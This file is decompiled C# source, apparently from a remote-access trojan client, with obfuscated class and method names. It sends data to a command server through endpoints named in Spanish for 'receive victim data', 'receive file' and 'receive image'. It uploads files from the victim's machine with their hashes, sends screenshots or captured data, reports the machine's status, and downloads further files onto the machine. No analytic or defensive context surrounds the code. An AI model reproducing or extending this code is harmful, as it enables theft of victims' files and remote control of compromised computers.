using System;
using System.Collections.Specialized;
using System.Net;
using System.Web;

internal sealed class Class5
{
	public static string string_0 = string.Empty;

	public static string string_1 = string.Empty;

	public static string string_2 = string.Empty;

	public static bool smethod_0()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			httpWebRequest.Abort();
			return httpWebResponse.StatusCode == HttpStatusCode.OK;
		}
		catch
		{
			return false;
		}
	}

	public static void smethod_1(string string_3)
	{
		WebClient webClient = new WebClient();
		string uriString = string_0 + "/actualizarEstadoMaquina.php?m=" + HttpUtility.UrlEncode(string_2) + "&s=" + HttpUtility.UrlEncode(string_3);
		webClient.DownloadString(new Uri(uriString));
	}

	public static string smethod_2(string string_3)
	{
		string text = string_3.Split(new char[1] { '/' })[^1];
		string text2 = Class6.smethod_3() + "\\" + text;
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(string_3, text2);
			return text2;
		}
		catch
		{
			return text2;
		}
	}

	public static void smethod_3(string string_3, string string_4, string string_5)
	{
		string value = Class3.smethod_0(string_3);
		string value2 = "." + string_3.Split(new char[1] { '.' })[^1];
		string_3 = string_3.Replace('/', '\\');
		string[] array = string_3.Split(new char[1] { '\\' });
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("m", string_2);
		nameValueCollection.Add("comando", string_4);
		nameValueCollection.Add("id", string_5);
		nameValueCollection.Add("formato", value2);
		nameValueCollection.Add("nombre", array[^1].Remove(array[^1].IndexOf(value2)));
		nameValueCollection.Add("respuesta", value);
		nameValueCollection.Add("firmaSHA1", Class2.smethod_2(string_3, "SHA1"));
		nameValueCollection.Add("firmaMD5", Class2.smethod_2(string_3, "MD5"));
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
		webClient.UploadValues(string_0 + "/RecibirArchivo.php", nameValueCollection);
	}

	public static void smethod_4()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("respuesta", Class6.smethod_7());
		nameValueCollection.Add("maquina", string_2);
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
		webClient.UploadValues(string_0 + "/RecibirImagen.php", nameValueCollection);
	}

	public static void smethod_5(string string_3, string string_4, string string_5, int int_0)
	{
		string empty = string.Empty;
		string_3 = string_3.Replace("\\", "\\\\");
		string_3 = string_3.Replace("á", "&aacute;");
		string_3 = string_3.Replace("é", "&eacute;");
		string_3 = string_3.Replace("í", "&iacute;");
		string_3 = string_3.Replace("ó", "&oacute;");
		string_3 = string_3.Replace("ú", "&uacute;");
		string_3 = string_3.Replace("ñ", "&ntilde;");
		if (string_5 == string.Empty)
		{
			string_5 = "0";
		}
		empty = string_0 + "/RecibirDatosVictima.php?comando=" + string_4 + "&respuesta=" + HttpUtility.UrlEncode(Class2.smethod_0(string_3)) + "&m=" + HttpUtility.UrlEncode(string_2) + "&id=" + HttpUtility.UrlEncode(string_5) + "&fin=" + HttpUtility.UrlEncode(int_0.ToString());
		WebClient webClient = new WebClient();
		webClient.DownloadString(new Uri(empty));
	}
}
